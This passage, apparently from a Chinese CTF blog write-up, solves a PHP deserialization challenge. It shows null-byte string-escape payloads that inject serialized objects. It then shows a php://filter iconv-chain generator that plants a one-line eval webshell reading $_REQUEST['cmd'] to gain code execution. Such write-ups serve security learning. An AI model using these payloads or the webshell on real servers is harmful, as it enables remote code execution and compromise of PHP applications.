str_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser);</code>根据这条，字符变多逃逸，先构造后面的序列化得到的内容是<code>&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;</code>长度共47，将\0换成00多出一个字符，总共需要47个进行逃逸构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?nep1=%f0abc%f0abc%f0abc%f0abc%9f%9f&amp;nep=Nep&amp;c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00<span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:7:&quot;</span>phpinfo<span class="hljs-string">&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>搜索flag就可以得到了，应该是因为gzctf的特性造成非预期得到的flag</p><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-variable">$exp</span>-&gt;str=<span class="hljs-keyword">new</span> B;<br><span class="hljs-variable">$exp</span>-&gt;str-&gt;b=<span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">new</span> A,<span class="hljs-number">1</span>=&gt;<span class="hljs-string">&#x27;readflag&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-comment">#O:1:&quot;C&quot;:2:&#123;s:1:&quot;s&quot;;s:1:&quot;a&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;key&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;</span><br><span class="hljs-comment">#字符串有不可见</span><br></code></pre></td></tr></table></figure><p>截取需要的内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;\00key\00&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>再根据这段的长度进行字符串进行逃逸，得到</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;a:2:&#123;i:0;O:1:&quot;</span>A<span class="hljs-string">&quot;:1:&#123;s:3:&quot;</span>key<span class="hljs-string">&quot;;S:5:&quot;</span>\<span class="hljs-number">00</span>key\<span class="hljs-number">00</span><span class="hljs-string">&quot;;&#125;i:1;s:8:&quot;</span>readflag<span class="hljs-string">&quot;;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>再配上上面那段nep组成payload，接下来分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key=== <span class="hljs-string">&quot;\0key\0&quot;</span>)&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$contents</span>);<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这题看了一下可以通过filter_chain进行rce写入马，然后得到flag</p><p>这里借用晨曦师傅的exp得到马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$base64_payload</span> = <span class="hljs-string">&quot;PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4&quot;</span>; <span class="hljs-comment">/*&lt;?php <span class="hljs-doctag">@eval</span>($_REQUEST[&#x27;cmd&#x27;]);?&gt;*/</span><br><span class="hljs-variable">$conversions</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;/&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;0&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;2&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,<br>    <span class="hljs-string">&#x27;3&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;5&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#x27;</span>,<br><span class="hljs-string">&#x27;6&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;7&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;8&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;9&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;A&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;B&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;C&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,<br>    <span class="hljs-string">&#x27;D&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;E&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,<br>    <span class="hljs-string">&#x27;F&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;G&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,<br>    <span class="hljs-string">&#x27;H&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;I&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;J&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;K&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;L&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,<br>    <span class="hljs-string">&#x27;M&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,<br>    <span class="hljs-string">&#x27;N&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;O&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,<br>    <span class="hljs-string">&#x27;P&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;Q&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;R&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,<br><span class="hljs-string">&#x27;S&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,<br>    <span class="hljs-string">&#x27;T&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,<br>    <span class="hljs-string">&#x27;U&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,<br>    <span class="hljs-string">&#x27;V&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;W&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,<br>    <span class="hljs-string">&#x27;X&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;Y&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,<br><span class="hljs-string">&#x27;Z&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;d&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;e&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,<br>    <span class="hljs-string">&#x27;f&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,<br>    <span class="hljs-string">&#x27;h&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;i&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,<br><span class="hljs-string">&#x27;j&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;k&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;l&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;m&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,<br>    <span class="hljs-string">&#x27;n&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;o&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;q&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;r&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,<br>    <span class="hljs-string">&#x27;s&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,<br>    <span class="hljs-string">&#x27;t&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,<br>    <span class="hljs-string">&#x27;u&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;v&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;w&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;x&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,<br>    <span class="hljs-string">&#x27;y&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,<br>    <span class="hljs-string">&#x27;z&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,<br>);<br><br><span class="hljs-variable">$filters</span> = <span class="hljs-string">&quot;convert.base64-encode|&quot;</span>;<br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$base64_payload</span>)) <span class="hljs-keyword">as</span> <span class="hljs-variable">$c</span>) &#123;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-variable">$conversions</span>[<span class="hljs-variable">$c</span>] . <span class="hljs-string">&quot;|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-decode|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-encode|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-decode&quot;</span>;<br><br><span class="hljs-variable">$final_payload</span> = <span class="hljs-string">&quot;php://filter/<span class="hljs-subst">&#123;$filters&#125;</span>/resource=index.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$final_payload</span>;<br></code></pre></td></tr></table></figure><p>得到答案最后就是</p><p>Get传参</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 